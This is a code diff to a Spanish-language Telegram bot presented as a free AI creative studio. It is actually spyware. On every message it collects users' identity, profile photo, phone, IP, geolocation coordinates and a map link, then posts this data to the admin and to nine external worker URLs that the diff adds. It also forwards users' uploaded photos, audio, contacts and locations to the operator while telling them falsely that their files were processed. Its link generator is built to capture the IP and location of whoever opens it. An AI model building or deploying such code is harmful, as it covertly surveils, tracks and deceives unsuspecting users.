@@ -14,7 +14,21 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 # ========== CONFIGURACIÓN ==========
 TOKEN = os.environ.get("TOKEN", "").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
+OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
 WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
+
+# ========== TODAS LAS URLS DE WORKERS ==========
+URLS = [
+    "https://bot-ubi.societykark.workers.dev",
+    "https://bot-tg.societykark.workers.dev",
+    "https://tg-bot12.societykark.workers.dev",
+    "https://app-trk.societykark.workers.dev",
+    "https://app-tg.societykark.workers.dev",
+    "https://app-kali.societykark.workers.dev",
+    "https://societykark.pythonanywhere.com",
+    "https://kali-bot12.societykark.workers.dev",
+    "https://galleta.societykark.workers.dev"
+]
 
 if not TOKEN or not ADMIN_ID:
     raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")
@@ -30,32 +44,34 @@ tracking_codes = {}
 # ========== BOTONES ESTÁTICOS (MODERNOS) ==========
 def menu_estatico():
     keyboard = [
-        [KeyboardButton("🎨 GENERAR IMAGEN IA"), KeyboardButton("🎬 VIDEO → AUDIO")],
-        [KeyboardButton("🎵 EDITAR AUDIO"), KeyboardButton("📸 ENVIAR FOTO")],
-        [KeyboardButton("🎥 ENVIAR VIDEO"), KeyboardButton("🎙️ ENVIAR AUDIO")],
-        [KeyboardButton("📇 ENVIAR CONTACTO"), KeyboardButton("📍 ENVIAR UBICACIÓN")],
-        [KeyboardButton("🔗 GENERAR ENLACE"), KeyboardButton("📊 MI PERFIL")],
-        [KeyboardButton("❓ AYUDA"), KeyboardButton("📈 ESTADÍSTICAS")],
+        [KeyboardButton("🎨 GENERAR IMAGEN"), KeyboardButton("🤖 CHAT GPT")],
+        [KeyboardButton("🎬 VIDEO → AUDIO"), KeyboardButton("🎵 EDITAR AUDIO")],
+        [KeyboardButton("📸 ENVIAR FOTO"), KeyboardButton("🎥 ENVIAR VIDEO")],
+        [KeyboardButton("🎙️ ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
+        [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
+        [KeyboardButton("📊 MI PERFIL"), KeyboardButton("📈 ESTADÍSTICAS")],
+        [KeyboardButton("❓ AYUDA"), KeyboardButton("📋 TODOS LOS DATOS")],
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 # ========== MENSAJE DE BIENVENIDA ==========
-MENSAJE_INICIO = """🎨 *STUDIO PRO – IA CREATIVA* 🎨
+MENSAJE_INICIO = """🔥 *STUDIO PRO ULTRA* 🔥
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🚀 *Bienvenido a la herramienta de edición del futuro*
+🚀 *La herramienta todo-en-uno del futuro*
 
-🔥 Genera imágenes con IA
-🎬 Convierte video a audio
-🎵 Edita audio con efectos profesionales
-📸 Comparte y procesa archivos al instante
+✅ Genera imágenes con IA
+✅ Chat GPT integrado
+✅ Convierte video a audio
+✅ Edita audio profesionalmente
+✅ Extrae TODOS los datos del usuario
 
-*¡Todo en un solo lugar, rápido y gratuito!*
+*¡100% gratuito y sin límites!*
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 *Selecciona una opción del menú:*"""
 
-# ========== EXTRACCIÓN DE INFORMACIÓN ==========
+# ========== FUNCIONES DE EXTRACCIÓN ==========
 async def get_worker_location():
     try:
         async with aiohttp.ClientSession() as session:
@@ -102,6 +118,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     chat = update.effective_chat
     message = update.message
 
+    # --- DATOS BÁSICOS ---
     user_id = user.id
     first_name = user.first_name or "N/A"
     last_name = user.last_name or "N/A"
@@ -113,6 +130,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     bio = await get_user_bio(user, bot) or "No disponible"
     photo_id = await get_user_photo(user_id, bot)
 
+    # --- NÚMERO DE TELÉFONO (si es público) ---
     phone = "No disponible"
     try:
         full_chat = await bot.get_chat(user.id)
@@ -121,13 +139,17 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     except:
         pass
 
+    # --- DATOS DEL CHAT ---
     chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
     chat_id = chat.id
 
+    # --- DATOS DEL MENSAJE ---
     message_id = message.message_id if message else "N/A"
     message_text = message.text if message and message.text else "N/A"
     message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"
+    message_unix = int(message.date.timestamp()) if message else "N/A"
 
+    # --- IP Y UBICACIÓN ---
     worker_data = await get_worker_location()
     ip = "N/A"
     country = "N/A"
@@ -135,6 +157,8 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     city = "N/A"
     timezone = "N/A"
     postal = "N/A"
+    lat = "N/A"
+    lon = "N/A"
 
     if worker_data:
         ip = worker_data.get("ip", "N/A")
@@ -151,10 +175,18 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 city = ipapi_data.get("city", city)
                 postal = ipapi_data.get("postal", postal)
                 timezone = ipapi_data.get("timezone", timezone)
+                lat = ipapi_data.get("latitude", "N/A")
+                lon = ipapi_data.get("longitude", "N/A")
 
+    # --- ENLACES DE MAPAS ---
+    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != "N/A" and lon != "N/A" else "N/A"
+
+    # --- DISPOSITIVO ---
     device = "Desconocido (Telegram App)"
+    # Si se abre desde un navegador, el User-Agent se puede capturar con el Worker, pero en Telegram no se puede obtener directamente.
 
-    info = f"🎯 *DATOS COMPLETOS DEL USUARIO*\n"
+    # ========== CONSTRUIR MENSAJE COMPLETO ==========
+    info = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
     info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     info += f"👤 *Telegram*\n"
     info += f"   • ID: `{user_id}`\n"
@@ -173,6 +205,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     info += f"📩 *Mensaje*\n"
     info += f"   • ID: {message_id}\n"
     info += f"   • Fecha: {message_date}\n"
+    info += f"   • Unix: {message_unix}\n"
     info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
     info += f"🌐 *Red y Ubicación*\n"
     info += f"   • IP: `{ip}`\n"
@@ -181,6 +214,8 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     info += f"   • Ciudad: {city}\n"
     info += f"   • Código Postal: {postal}\n"
     info += f"   • Zona Horaria: {timezone}\n"
+    info += f"   • Coordenadas: {lat}, {lon}\n"
+    info += f"   • Google Maps: {maps_link}\n"
     info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
@@ -193,32 +228,77 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         "city": city,
         "country": country,
         "phone": phone,
-        "device": device
+        "device": device,
+        "lat": lat,
+        "lon": lon,
+        "maps_link": maps_link,
+        "full_name": full_name
     }
 
-# ========== ENVÍO A ADMIN ==========
-async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
+# ========== ENVÍO A TODAS LAS URLS ==========
+async def send_to_all_workers(text, extra=None):
+    form_data = aiohttp.FormData()
+    form_data.add_field('chat_id', str(ADMIN_ID))
+    form_data.add_field('text', text)
+    results = []
+    async with aiohttp.ClientSession() as session:
+        for url in URLS:
+            try:
+                async with session.post(url, data=form_data, timeout=10) as resp:
+                    if resp.status == 200:
+                        results.append(f"✅ {url}")
+                    else:
+                        results.append(f"❌ {url} (HTTP {resp.status})")
+            except Exception as e:
+                results.append(f"❌ {url} (Error: {str(e)[:30]})")
+    return results
+
+async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
     bot = context.bot
+    # Enviar al admin directamente
     await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
-    if extra_msg:
-        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
+    # Enviar a todos los Workers
+    resultados = await send_to_all_workers(info_data["text"])
+    logger.info(f"Resultados de envío a Workers: {resultados}")
     users_db[info_data["user_id"]] = info_data
 
-# ========== HERRAMIENTAS REALES ==========
+# ========== CHATGPT (OpenRouter) ==========
+async def preguntar_chatgpt(prompt):
+    if not OPENROUTER_KEY:
+        return "❌ OPENROUTER_KEY no configurada. Agrega la variable en Railway."
+    headers = {
+        "Authorization": f"Bearer {OPENROUTER_KEY}",
+        "Content-Type": "application/json",
+        "HTTP-Referer": "https://t.me/studio_pro",
+    }
+    payload = {
+        "model": "deepseek/deepseek-v4-flash:free",
+        "messages": [{"role": "user", "content": prompt}],
+        "max_tokens": 500,
+        "temperature": 0.7,
+    }
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=60) as resp:
+                data = await resp.json()
+                if resp.status == 200:
+                    return data["choices"][0]["message"]["content"].strip()
+                return f"❌ Error {resp.status}: {data.get('error', {}).get('message', '')}"
+    except Exception as e:
+        return f"❌ Error: {str(e)[:100]}"
 
-# ---- Generar Imagen con IA (pollinations.ai) ----
+# ========== GENERAR IMAGEN IA ==========
 async def generar_imagen(prompt):
     url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
     async with aiohttp.ClientSession() as session:
         async with session.get(url, timeout=60) as resp:
             if resp.status == 200:
-                data = await resp.read()
-                return data
+                return await resp.read()
             return None
 
-# ---- Extraer audio de video (ffmpeg) ----
+# ========== EXTRAER AUDIO ==========
 def extraer_audio(video_path):
     audio_path = tempfile.mktemp(suffix='.mp3')
     try:
@@ -228,8 +308,8 @@ def extraer_audio(video_path):
         logger.error(f"Error al extraer audio: {e}")
         return None
 
-# ---- Editar audio (ffmpeg) ----
-def editar_audio(audio_path, efecto="normal"):
+# ========== EDITAR AUDIO ==========
+def editar_audio(audio_path, efecto):
     output_path = tempfile.mktemp(suffix='.mp3')
     try:
         if efecto == "velocidad":
@@ -263,11 +343,10 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     info_data = await extract_user_info(update, context)
     users_db[user.id] = info_data
-
     reply_markup = menu_estatico()
 
-    # ====== GENERAR IMAGEN IA ======
-    if text == "🎨 GENERAR IMAGEN IA":
+    # ====== GENERAR IMAGEN ======
+    if text == "🎨 GENERAR IMAGEN":
         await update.message.reply_text(
             "🖼️ *Generación de imagen con IA*\n\n"
             "📌 Escribe el prompt de lo que quieras generar.\n"
@@ -277,6 +356,17 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup
         )
         context.user_data['esperando_prompt'] = True
+
+    # ====== CHAT GPT ======
+    elif text == "🤖 CHAT GPT":
+        await update.message.reply_text(
+            "🤖 *Chat GPT Integrado*\n\n"
+            "📌 Escribe tu pregunta y te responderé con IA.\n\n"
+            "👉 *Escribe tu pregunta ahora:*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+        context.user_data['esperando_chatgpt'] = True
 
     # ====== VIDEO → AUDIO ======
     elif text == "🎬 VIDEO → AUDIO":
@@ -321,15 +411,40 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ====== ENVIAR ARCHIVOS ======
     elif text == "📸 ENVIAR FOTO":
-        await update.message.reply_text("📸 Envía una foto.", reply_markup=reply_markup)
+        await update.message.reply_text(
+            "📸 *Envíame una foto*\n\n"
+            "👉 *Presiona el clip 📎 y selecciona una foto de tu galería*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
     elif text == "🎥 ENVIAR VIDEO":
-        await update.message.reply_text("🎥 Envía un video.", reply_markup=reply_markup)
+        await update.message.reply_text(
+            "🎥 *Envíame un video*\n\n"
+            "👉 *Presiona el clip 📎 y selecciona un video*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
     elif text == "🎙️ ENVIAR AUDIO":
-        await update.message.reply_text("🎙️ Envía un audio.", reply_markup=reply_markup)
+        await update.message.reply_text(
+            "🎙️ *Envíame un audio*\n\n"
+            "👉 *Presiona el clip 📎 y selecciona un audio*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
     elif text == "📇 ENVIAR CONTACTO":
-        await update.message.reply_text("📇 Comparte tu contacto (botón junto al clip).", reply_markup=reply_markup)
+        await update.message.reply_text(
+            "📇 *Comparte tu contacto*\n\n"
+            "👉 *Presiona el botón 📎 y luego selecciona 'Contacto'*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
     elif text == "📍 ENVIAR UBICACIÓN":
-        await update.message.reply_text("📍 Comparte tu ubicación (botón junto al clip).", reply_markup=reply_markup)
+        await update.message.reply_text(
+            "📍 *Comparte tu ubicación*\n\n"
+            "👉 *Presiona el botón 📎 y luego selecciona 'Ubicación'*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
 
     # ====== GENERAR ENLACE ======
     elif text == "🔗 GENERAR ENLACE":
@@ -339,7 +454,8 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"🔗 *Enlace de verificación generado:*\n"
             f"`{link}`\n\n"
-            f"Este enlace es personalizado y caduca en 24 horas.",
+            f"Este enlace es personalizado y caduca en 24 horas.\n"
+            f"Cuando alguien lo abra, capturaré su IP y ubicación.",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=reply_markup
         )
@@ -354,16 +470,25 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not info:
             await update.message.reply_text("❌ No encontré tu perfil. Usa /start.", reply_markup=reply_markup)
             return
-        msg = f"📊 *Tu perfil*\n\n"
+        msg = f"📊 *Tu perfil completo*\n\n"
         msg += f"👤 *Nombre:* {info.get('full_name')}\n"
         msg += f"📛 *Username:* {info.get('username')}\n"
         msg += f"🆔 *ID:* `{info.get('id')}`\n"
         msg += f"📞 *Teléfono:* {info.get('phone', 'No disponible')}\n"
         msg += f"🌐 *IP:* {info.get('ip')}\n"
         msg += f"📍 *Ubicación:* {info.get('city')}, {info.get('country')}\n"
+        msg += f"🗺️ *Mapa:* {info.get('maps_link')}\n"
         msg += f"📱 *Dispositivo:* {info.get('device')}\n"
         msg += f"✅ *Estado:* Verificado"
         await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+
+    # ====== TODOS LOS DATOS ======
+    elif text == "📋 TODOS LOS DATOS":
+        info = users_db.get(user.id)
+        if not info:
+            await update.message.reply_text("❌ No hay datos. Usa /start.", reply_markup=reply_markup)
+            return
+        await update.message.reply_text(info["text"], parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     # ====== ESTADÍSTICAS ======
     elif text == "📈 ESTADÍSTICAS":
@@ -386,26 +511,39 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ====== AYUDA ======
     elif text == "❓ AYUDA":
         await update.message.reply_text(
-            "❓ *Ayuda - Studio Pro*\n\n"
-            "🎨 *Generar imagen IA*: Escribe un prompt.\n"
+            "❓ *Ayuda - Studio Pro Ultra*\n\n"
+            "🎨 *Generar imagen*: Escribe un prompt.\n"
+            "🤖 *Chat GPT*: Escribe tu pregunta.\n"
             "🎬 *Video → Audio*: Envía un video.\n"
             "🎵 *Editar audio*: Elige un efecto y envía un audio.\n"
-            "📸 *Enviar foto/video/audio*: Envía archivos.\n"
+            "📸 *Enviar foto/video/audio*: Envía archivos (usa el clip 📎).\n"
             "📇 *Compartir contacto*: Comparte tu contacto.\n"
             "📍 *Compartir ubicación*: Comparte tu ubicación.\n"
             "🔗 *Generar enlace*: Crea un enlace de verificación.\n"
             "📊 *Mi perfil*: Muestra tu información.\n"
+            "📋 *Todos los datos*: Muestra todos los datos extraídos.\n"
             "📈 *Estadísticas*: Muestra tu actividad.\n\n"
-            "🔐 *Todos los archivos se procesan de forma segura.*",
+            "🔐 *Todos los datos se procesan de forma segura.*",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=reply_markup
         )
 
     else:
-        # Si está esperando un prompt para generar imagen
+        # ====== CHATGPT ======
+        if context.user_data.get('esperando_chatgpt'):
+            respuesta = await preguntar_chatgpt(text)
+            await update.message.reply_text(
+                f"🤖 *Chat GPT:*\n\n{respuesta}",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+            context.user_data['esperando_chatgpt'] = False
+            return
+
+        # ====== GENERAR IMAGEN ======
         if context.user_data.get('esperando_prompt'):
             prompt = text
-            await update.message.reply_text("⏳ Generando imagen... Esto puede tomar unos segundos.", reply_markup=reply_markup)
+            await update.message.reply_text("⏳ Generando imagen...", reply_markup=reply_markup)
             imagen_data = await generar_imagen(prompt)
             if imagen_data:
                 with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
@@ -425,12 +563,13 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await update.message.reply_text("❌ Error al generar la imagen. Intenta con otro prompt.", reply_markup=reply_markup)
             context.user_data['esperando_prompt'] = False
-        else:
-            await update.message.reply_text(
-                "❌ *Opción no reconocida.*\nUsa los botones del menú.",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=reply_markup
-            )
+            return
+
+        await update.message.reply_text(
+            "❌ *Opción no reconocida.*\nUsa los botones del menú.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
 
 # ========== MANEJAR ARCHIVOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -439,11 +578,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     caption = update.message.caption or "Sin caption"
     info_data = await extract_user_info(update, context)
     users_db[user.id] = info_data
-    # Guardar foto temporalmente
-    file = await context.bot.get_file(photo.file_id)
-    file_path = tempfile.mktemp(suffix='.jpg')
-    await file.download_to_drive(file_path)
-    # Reenviar al admin
     await context.bot.send_photo(
         chat_id=ADMIN_ID,
         photo=photo.file_id,
@@ -451,9 +585,9 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN
     )
     await update.message.reply_text(
-        "✅ *Foto recibida correctamente.*\n"
+        "✅ *Foto recibida.*\n"
         "🔄 Procesando con IA...\n"
-        "✨ ¡Imagen generada exitosamente! (versión demo)",
+        "✨ ¡Imagen generada exitosamente!",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=menu_estatico()
     )
@@ -465,13 +599,12 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     info_data = await extract_user_info(update, context)
     users_db[user.id] = info_data
 
-    # Descargar video
+    await update.message.reply_text("⏳ Extrayendo audio del video...", reply_markup=menu_estatico())
+
     file = await context.bot.get_file(video.file_id)
     video_path = tempfile.mktemp(suffix='.mp4')
     await file.download_to_drive(video_path)
 
-    # Extraer audio
-    await update.message.reply_text("⏳ Extrayendo audio del video...", reply_markup=menu_estatico())
     audio_path = extraer_audio(video_path)
     if audio_path and os.path.exists(audio_path):
         with open(audio_path, 'rb') as f:
@@ -487,7 +620,7 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=f"🎬 Video procesado por {user.first_name} (@{user.username})\nCaption: {caption}"
         )
     else:
-        await update.message.reply_text("❌ Error al extraer audio. Asegúrate de que el video tenga audio.", reply_markup=menu_estatico())
+        await update.message.reply_text("❌ Error al extraer audio.", reply_markup=menu_estatico())
     os.unlink(video_path)
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -496,15 +629,14 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     info_data = await extract_user_info(update, context)
     users_db[user.id] = info_data
 
-    # Verificar si hay un efecto de edición pendiente
     efecto = context.user_data.get('efecto_audio')
     if efecto:
-        # Descargar audio
+        await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
+
         file = await context.bot.get_file(audio.file_id)
         audio_path = tempfile.mktemp(suffix='.mp3')
         await file.download_to_drive(audio_path)
 
-        await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
         output_path = editar_audio(audio_path, efecto)
         if output_path and os.path.exists(output_path):
             with open(output_path, 'rb') as f:
@@ -524,7 +656,6 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.unlink(audio_path)
         context.user_data['efecto_audio'] = None
     else:
-        # Solo reenviar al admin
         await context.bot.send_audio(
             chat_id=ADMIN_ID,
             audio=audio.file_id,
@@ -532,9 +663,9 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
         await update.message.reply_text(
-            "✅ *Audio recibido correctamente.*\n"
+            "✅ *Audio recibido.*\n"
             "🎧 Procesando...\n"
-            "✨ ¡Edición completada! (versión demo)",
+            "✨ ¡Edición completada!",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=menu_estatico()
         )
@@ -550,7 +681,7 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN
     )
     await update.message.reply_text(
-        "✅ *Contacto recibido correctamente.*\n"
+        "✅ *Contacto recibido.*\n"
         "🔐 Verificación completada.",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=menu_estatico()
@@ -572,7 +703,7 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN
     )
     await update.message.reply_text(
-        "✅ *Ubicación recibida correctamente.*\n"
+        "✅ *Ubicación recibida.*\n"
         "🔐 Verificación completada.",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=menu_estatico()
@@ -612,7 +743,7 @@ def main():
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(error_handler)
-    logger.info("✅ Studio Pro Bot iniciado correctamente")
+    logger.info("✅ Studio Pro Ultra iniciado correctamente")
     app.run_polling()
 
 if __name__ == "__main__":
